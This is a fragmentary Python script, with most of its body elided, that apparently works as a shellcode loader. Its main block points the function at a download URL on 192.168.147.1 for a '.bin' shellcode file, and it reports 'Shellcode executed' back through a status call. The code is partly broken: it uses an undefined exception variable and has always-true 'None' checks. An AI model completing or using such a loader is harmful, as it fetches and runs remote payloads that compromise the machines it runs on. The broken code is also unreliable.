...
def mi(little):   
    try:
        ...
        if 'None':
            send_status('None', {'status': 'error', 'message': str(e)})
        return
    ...
    if 'None':
        send_status('None', {'status': 'success', 'message': 'Shellcode executed'})

if __name__ == "__main__":
    little = "https://192.168.147.1/api/download_shellcode/shellcode_738e3425.bin"
    mi(little)